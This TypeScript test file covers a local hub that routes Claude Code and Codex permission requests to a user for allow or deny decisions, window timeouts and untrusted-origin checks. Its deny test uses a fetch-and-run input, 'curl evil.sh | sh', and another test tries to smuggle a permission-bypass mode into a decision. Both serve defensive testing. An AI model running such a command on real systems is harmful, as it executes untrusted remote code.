import assert from "node:assert/strict";
import { spawn, type ChildProcess } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { after, before, describe, it } from "node:test";
import { fixtures, freePort, makeSandbox, serverDir, startServer, waitFor, type RunningServer } from "./helpers.js";

const box = makeSandbox("cchub-g1-approvals-");
const fakeUser = join(box.tmp, "user");
const claudeDir = join(fakeUser, ".claude");
const openCapture = join(box.tmp, "open-capture.txt");
const notifyHook = join(serverDir, "hooks", "notify.mjs");
const codexHook = join(serverDir, "hooks", "codex-notify.mjs");
const SAMPLE_THREAD = "01a0aaaa-0000-7000-8000-000000000001";
let hub: RunningServer;
const running = new Set<ChildProcess>();

interface HookRun {
  code: number | null;
  ms: number;
  stdout: string;
}

interface Pending {
  id: string;
  agent: string;
  sessionId: string;
  toolName: string;
  toolInput: unknown;
  windowMs: number;
  expiresAt: number;
}

const CLEAN_ENV_KEYS = ["CLAUDE_CODE_ENTRYPOINT", "CLAUDE_CODE_SESSION_ID", "HUB_DELEGATED", "HUB_TRACK_SDK", "HUB_SHARE_LABEL", "HUB_TASK_ID", "HUB_RUN_ID", "HUB_HOOK_INLINE", "CLAUDE_PID"];

function hookEnv(port: number, extra: Record<string, string>): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = {
    ...process.env,
    HOME: fakeUser,
    USERPROFILE: fakeUser,
    CLAUDE_CONFIG_DIR: claudeDir,
    CODEX_HOME: box.codexHome,
    HUB_HOST_TARGET: "127.0.0.1",
    HUB_PORT: String(port),
    HUB_SKIP: "0",
  };
  for (const key of CLEAN_ENV_KEYS) delete env[key];
  return { ...env, ...extra };
}

function runHook(script: string, port: number, input: Record<string, unknown>, extra: Record<string, string> = {}): { done: Promise<HookRun>; child: ChildProcess } {
  const started = Date.now();
  const child = spawn(process.execPath, [script], { env: hookEnv(port, extra), stdio: ["pipe", "pipe", "ignore"] });
  running.add(child);
  let stdout = "";
  child.stdout?.on("data", (chunk: Buffer) => {
    stdout += chunk.toString();
  });
  const done = new Promise<HookRun>((resolve) => {
    child.on("close", (code) => {
      running.delete(child);
      resolve({ code, ms: Date.now() - started, stdout });
    });
  });
  child.stdin?.end(JSON.stringify(input));
  return { done, child };
}

async function http(method: string, path: string, body?: unknown, origin?: string): Promise<{ status: number; json: unknown }> {
  const headers: Record<string, string> = { "content-type": "application/json" };
  if (origin) headers.origin = origin;
  const res = await fetch(`${hub.base}${path}`, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) });
  const text = await res.text();
  return { status: res.status, json: text ? JSON.parse(text) : null };
}

const pendingList = async (): Promise<Pending[]> => (await http("GET", "/api/permissions")).json as Pending[];

const pendingFor = (sessionId: string): Promise<Pending> =>
  waitFor(async () => (await pendingList()).find((item) => item.sessionId === sessionId) ?? null, 10_000);

const permissionInput = (sessionId: string, command: string): Record<string, unknown> => ({
  hook_event_name: "PermissionRequest",
  session_id: sessionId,
  cwd: box.repoA,
  tool_name: "Bash",
  tool_input: { command, description: "test command" },
  permission_suggestions: [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: command }], behavior: "allow", destination: "localSettings" }],
});

const setWindow = async (approvals: Record<string, number>): Promise<void> => {
  const res = await http("PUT", "/delegation/settings", { approvals });
  assert.equal(res.status, 200, JSON.stringify(res.json));
};

before(async () => {
  mkdirSync(claudeDir, { recursive: true });
  hub = await startServer(box, {
    HOME: fakeUser,
    USERPROFILE: fakeUser,
    CLAUDE_CONFIG_DIR: claudeDir,
    HUB_SHARE_PORT: "0",
    HUB_DELEGATION: "1",
    HUB_URL_OPENER: JSON.stringify([process.execPath, join(fixtures, "fake-open-url.mjs")]),
    FAKE_OPEN_CAPTURE: openCapture,
  });
});

after(() => {
  for (const child of running) child.kill();
  hub.child.kill();
  rmSync(box.tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
});

describe("approval window settings", () => {
  it("defaults to 300 s for Claude and 20 s for Codex and rejects bad values", async () => {
    const settings = (await http("GET", "/delegation/settings")).json as { approvals: { claudeWindowSec: number; codexWindowSec: number } };
    assert.deepEqual(settings.approvals, { claudeWindowSec: 300, codexWindowSec: 20 });
    assert.equal((await http("PUT", "/delegation/settings", { approvals: { claudeWindowSec: -1 } })).status, 400);
    assert.equal((await http("PUT", "/delegation/settings", { approvals: { codexWindowSec: 1801 } })).status, 400);
    assert.equal((await http("PUT", "/delegation/settings", { approvals: { claudeWindowSec: 1.5 } })).status, 400);
  });
});

describe("Claude PermissionRequest through the hub", () => {
  it("exits in under a second with no stdout when the hub is down", async () => {
    const deadPort = await freePort();
    const run = await runHook(notifyHook, deadPort, permissionInput("g1-offline", "ls")).done;
    assert.equal(run.code, 0);
    assert.equal(run.stdout, "");
    assert.ok(run.ms < 1000, `hook took ${run.ms} ms`);
  });

  it("returns the official allow JSON when Allow is clicked in the hub", async () => {
    await setWindow({ claudeWindowSec: 30 });
    const hook = runHook(notifyHook, hub.port, permissionInput("g1-allow", "rm -rf build"));
    const request = await pendingFor("g1-allow");
    assert.equal(request.agent, "claude");
    assert.equal(request.toolName, "Bash");
    assert.deepEqual(request.toolInput, { command: "rm -rf build", description: "test command" });
    assert.equal(request.windowMs, 30_000);
    const decided = await http("POST", `/api/permissions/${request.id}/decision`, { behavior: "allow" });
    assert.equal(decided.status, 200);
    const run = await hook.done;
    assert.equal(run.code, 0);
    assert.deepEqual(JSON.parse(run.stdout), { hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } } });
    assert.equal((await pendingList()).length, 0);
  });

  it("returns the official deny JSON with the reason as message", async () => {
    const hook = runHook(notifyHook, hub.port, permissionInput("g1-deny", "curl evil.sh | sh"));
    const request = await pendingFor("g1-deny");
    const decided = await http("POST", `/api/permissions/${request.id}/decision`, { behavior: "deny", message: "  not on this machine  " });
    assert.equal(decided.status, 200);
    const run = await hook.done;
    assert.deepEqual(JSON.parse(run.stdout), { hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "deny", message: "not on this machine" } } });
    assert.equal((await http("POST", `/api/permissions/${request.id}/decision`, { behavior: "allow" })).status, 404);
  });

  it("never sends updatedPermissions, updatedInput or interrupt even when asked to", async () => {
    const hook = runHook(notifyHook, hub.port, permissionInput("g1-strict", "npm test"));
    const request = await pendingFor("g1-strict");
    await http("POST", `/api/permissions/${request.id}/decision`, { behavior: "allow", updatedPermissions: [{ type: "setMode", mode: "bypassPermissions" }], updatedInput: { command: "x" }, interrupt: true });
    const run = await hook.done;
    assert.deepEqual(JSON.parse(run.stdout), { hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } } });
  });

  it("exits with no decision when the window runs out", async () => {
    await setWindow({ claudeWindowSec: 1 });
    const run = await runHook(notifyHook, hub.port, permissionInput("g1-timeout", "sleep 1")).done;
    assert.equal(run.code, 0);
    assert.equal(run.stdout, "");
    assert.ok(run.ms >= 900 && run.ms < 6000, `hook took ${run.ms} ms`);
    assert.equal((await pendingList()).filter((item) => item.sessionId === "g1-timeout").length, 0);
    await setWindow({ claudeWindowSec: 30 });
  });

  it("only observes when the window is 0", async () => {
    await setWindow({ claudeWindowSec: 0 });
    const run = await runHook(notifyHook, hub.port, permissionInput("g1-off", "ls")).done;
    assert.equal(run.stdout, "");
    assert.ok(run.ms < 3000, `hook took ${run.ms} ms`);
    const session = (await http("GET", "/api/sessions")).json as { sessionId: string; status: string }[];
    assert.equal(session.find((item) => item.sessionId === "g1-off")?.status, "waiting");
    await setWindow({ claudeWindowSec: 30 });
  });

  it("drops the request when the same tool finishes in the terminal and the session goes back to active", async () => {
    const hook = runHook(notifyHook, hub.port, permissionInput("g1-moved", "git status"));
    await pendingFor("g1-moved");
    const before = (await http("GET", "/api/sessions")).json as { sessionId: string; status: string }[];
    assert.equal(before.find((item) => item.sessionId === "g1-moved")?.status, "waiting");
    await http("POST", "/hook", { kind: "tool_done", sessionId: "g1-moved", toolName: "Read", toolInput: { file_path: "x" } });
    assert.equal((await pendingList()).filter((item) => item.sessionId === "g1-moved").length, 1);
    await http("POST", "/hook", { kind: "tool_done", sessionId: "g1-moved", toolName: "Bash", toolInput: { command: "git status", description: "test command" } });
    const run = await hook.done;
    assert.equal(run.stdout, "");
    assert.equal((await pendingList()).filter((item) => item.sessionId === "g1-moved").length, 0);
    const after = (await http("GET", "/api/sessions")).json as { sessionId: string; status: string }[];
    assert.equal(after.find((item) => item.sessionId === "g1-moved")?.status, "active");
  });

  it("drops the request on Stop, a new prompt and SessionEnd", async () => {
    for (const kind of ["stop", "user_prompt", "session_end"]) {
      const sessionId = `g1-next-${kind}`;
      const hook = runHook(notifyHook, hub.port, permissionInput(sessionId, "make"));
      await pendingFor(sessionId);
      await http("POST", "/hook", { kind, sessionId });
      const run = await hook.done;
      assert.equal(run.stdout, "", kind);
      assert.equal((await pendingList()).filter((item) => item.sessionId === sessionId).length, 0, kind);
    }
  });

  it("drops the request when Claude kills the hook", async () => {
    const hook = runHook(notifyHook, hub.port, permissionInput("g1-killed", "make"));
    await pendingFor("g1-killed");
    hook.child.kill();
    await hook.done;
    await waitFor(async () => ((await pendingList()).some((item) => item.sessionId === "g1-killed") ? null : true), 5000);
  });

  it("does not wait in headless or hub-delegated sessions", async () => {
    const run = await runHook(notifyHook, hub.port, permissionInput("g1-headless", "ls"), { CLAUDE_CODE_ENTRYPOINT: "sdk-cli", HUB_TRACK_SDK: "1", HUB_DELEGATED: "1" }).done;
    assert.equal(run.stdout, "");
    assert.ok(run.ms < 3000, `hook took ${run.ms} ms`);
    assert.equal((await pendingList()).filter((item) => item.sessionId === "g1-headless").length, 0);
    const direct = await http("POST", "/api/permissions/request", { agent: "claude", sessionId: "g1-headless", toolName: "Bash", toolInput: {}, delegated: true });
    assert.deepEqual(direct.json, { id: null, windowMs: 0, expiresAt: null });
  });

  it("caps a subagent's request at 20 s", async () => {
    await setWindow({ claudeWindowSec: 300 });
    const opened = (await http("POST", "/api/permissions/request", { agent: "claude", sessionId: "g1-sub", agentId: "agent-1", toolName: "Bash", toolInput: {} })).json as { id: string; windowMs: number };
    assert.equal(opened.windowMs, 20_000);
    await http("POST", "/hook", { kind: "subagent_stop", sessionId: "g1-sub", agentId: "agent-1" });
    assert.equal((await pendingList()).filter((item) => item.sessionId === "g1-sub").length, 0);
    await setWindow({ claudeWindowSec: 30 });
  });

  it("refuses a decision from an untrusted browser origin", async () => {
    const hook = runHook(notifyHook, hub.port, permissionInput("g1-origin", "ls"));
    const request = await pendingFor("g1-origin");
    assert.equal((await http("POST", `/api/permissions/${request.id}/decision`, { behavior: "allow" }, "https://evil.example.com")).status, 403);
    assert.equal((await http("GET", "/api/permissions", undefined, "https://evil.example.com")).status, 403);
    assert.equal((await http("POST", `/api/permissions/${request.id}/decision`, { behavior: "deny" }, "http://tauri.localhost")).status, 200);
    const run = await hook.done;
    assert.deepEqual(JSON.parse(run.stdout), { hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "deny" } } });
  });

  it("rejects a decision for an id that is not pending", async () => {
    assert.equal((await http("POST", "/api/permissions/not-a-request/decision", { behavior: "allow" })).status, 404);
    assert.equal((await http("POST", "/api/permissions/not-a-request/decision", { behavior: "always" })).status, 400);
  });
});

interface CodexThread {
  id: string;
  status: string;
  client: string;
}

const codexThreads = async (): Promise<CodexThread[]> => (await http("GET", "/api/codex/sessions")).json as CodexThread[];

describe("Codex hooks", () => {
  it("move the Codex session through waiting, active and idle without duplicating it", async () => {
    const hook = runHook(codexHook, hub.port, {
      hook_event_name: "PermissionRequest",
      session_id: SAMPLE_THREAD,
      turn_id: "turn-1",
      cwd: "C:\\work\\sample",
      model: "gpt-5",
      tool_name: "shell",
      tool_input: { command: ["git", "push"], description: "push" },
    });
    const request = await pendingFor(SAMPLE_THREAD);
    assert.equal(request.agent, "codex");
    assert.equal(request.windowMs, 20_000);
    const waiting = (await codexThreads()).filter((thread) => thread.id === SAMPLE_THREAD);
    assert.equal(waiting.length, 1);
    assert.equal(waiting[0]?.status, "waiting");
    await http("POST", `/api/permissions/${request.id}/decision`, { behavior: "allow" });
    const run = await hook.done;
    assert.deepEqual(JSON.parse(run.stdout), { hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } } });
    const post = await runHook(codexHook, hub.port, { hook_event_name: "PostToolUse", session_id: SAMPLE_THREAD, tool_name: "shell", tool_use_id: "t1", tool_input: { command: ["git", "push"] }, tool_response: {} }).done;
    assert.equal(post.stdout, "");
    assert.equal((await codexThreads()).find((thread) => thread.id === SAMPLE_THREAD)?.status, "active");
    const stop = await runHook(codexHook, hub.port, { hook_event_name: "Stop", session_id: SAMPLE_THREAD, turn_id: "turn-1", stop_hook_active: false, last_assistant_message: "pushed" }).done;
    assert.equal(stop.stdout, "");
    const threads = (await codexThreads()).filter((thread) => thread.id === SAMPLE_THREAD);
    assert.equal(threads.length, 1);
    assert.equal(threads[0]?.status, "idle");
  });

  it("shows a session that has no rollout yet and drops a pending request on Stop", async () => {
    const hook = runHook(codexHook, hub.port, { hook_event_name: "PermissionRequest", session_id: "g1-codex-new", cwd: box.repoB, tool_name: "shell", tool_input: { command: ["ls"] } });
    await pendingFor("g1-codex-new");
    assert.equal((await codexThreads()).filter((thread) => thread.id === "g1-codex-new").length, 1);
    await runHook(codexHook, hub.port, { hook_event_name: "Stop", session_id: "g1-codex-new", stop_hook_active: false }).done;
    const run = await hook.done;
    assert.equal(run.stdout, "");
    assert.equal((await pendingList()).filter((item) => item.sessionId === "g1-codex-new").length, 0);
  });

  it("does not wait inside a hub delegation", async () => {
    const run = await runHook(codexHook, hub.port, { hook_event_name: "PermissionRequest", session_id: "g1-codex-run", tool_name: "shell", tool_input: {} }, { HUB_TASK_ID: "task-1", HUB_RUN_ID: "run-1" }).done;
    assert.equal(run.stdout, "");
    assert.equal((await pendingList()).filter((item) => item.sessionId === "g1-codex-run").length, 0);
  });

  it("exits in under a second with no stdout when the hub is down", async () => {
    const run = await runHook(codexHook, await freePort(), { hook_event_name: "PermissionRequest", session_id: "g1-codex-off", tool_name: "shell", tool_input: {} }).done;
    assert.equal(run.stdout, "");
    assert.ok(run.ms < 1000, `hook took ${run.ms} ms`);
  });
});

describe("Codex hooks installer routes", () => {
  interface Status {
    path: string;
    installed: boolean;
    updateAvailable: boolean;
    missing: string[];
    trustNote: string;
  }

  it("installs into the sandbox CODEX_HOME, flags an update after the window changes and removes the file", async () => {
    const path = join(box.codexHome, "hooks.json");
    const before = (await http("GET", "/delegation/connect/codex-hooks")).json as Status;
    assert.equal(before.path.toLowerCase(), path.toLowerCase());
    assert.equal(before.installed, false);
    const installed = (await http("POST", "/delegation/connect/codex-hooks", { action: "install" })).json as Status;
    assert.equal(installed.installed, true);
    assert.ok(existsSync(path));
    await setWindow({ codexWindowSec: 40 });
    const stale = (await http("GET", "/delegation/connect")).json as { codexHooks: Status };
    assert.equal(stale.codexHooks.updateAvailable, true);
    assert.deepEqual(stale.codexHooks.missing, ["PermissionRequest"]);
    await http("POST", "/delegation/connect/codex-hooks", { action: "install" });
    const removed = (await http("POST", "/delegation/connect/codex-hooks", { action: "uninstall" })).json as Status;
    assert.equal(removed.installed, false);
    assert.equal(existsSync(path), false);
    await setWindow({ codexWindowSec: 20 });
  });
});

describe("open and reply", () => {
  const captured = (): string[] => (existsSync(openCapture) ? readFileSync(openCapture, "utf8").trim().split(/\r?\n/).filter(Boolean) : []);

  it("opens a VS Code panel session by the official deep link", async () => {
    await http("POST", "/hook", { kind: "session_start", sessionId: "g1-vscode", client: "vscode" });
    const res = await http("POST", "/api/sessions/g1-vscode/open");
    assert.equal(res.status, 200);
    assert.equal((res.json as { method: string }).method, "deep-link");
    assert.ok(captured().includes("vscode://anthropic.claude-code/open?session=g1-vscode"), captured().join(","));
  });

  it("falls back to the deep link when focusing a VS Code panel session fails", async () => {
    const before = captured().filter((url) => url.endsWith("session=g1-vscode")).length;
    const res = await http("POST", "/api/sessions/g1-vscode/focus");
    assert.equal((res.json as { method: string }).method, "deep-link");
    assert.equal(captured().filter((url) => url.endsWith("session=g1-vscode")).length, before + 1);
  });

  it("keeps Focus for a terminal session", async () => {
    await http("POST", "/hook", { kind: "session_start", sessionId: "g1-term", client: "terminal" });
    const res = await http("POST", "/api/sessions/g1-term/open");
    assert.equal((res.json as { method: string }).method, "focus");
    assert.ok(!captured().some((url) => url.includes("g1-term")));
  });

  it("opens a Codex app thread by codex://threads/<id>", async () => {
    const res = await http("POST", `/api/codex/${SAMPLE_THREAD}/open`);
    assert.equal((res.json as { method: string }).method, "deep-link");
    assert.ok(captured().includes(`codex://threads/${SAMPLE_THREAD}`));
  });

  it("refuses to reply to a Codex thread the hub did not start", async () => {
    const res = await http("POST", `/delegation/codex/${SAMPLE_THREAD}/reply`, { text: "go on" });
    assert.equal(res.status, 409);
    assert.equal((res.json as { code: string }).code, "not-hub-thread");
  });
});
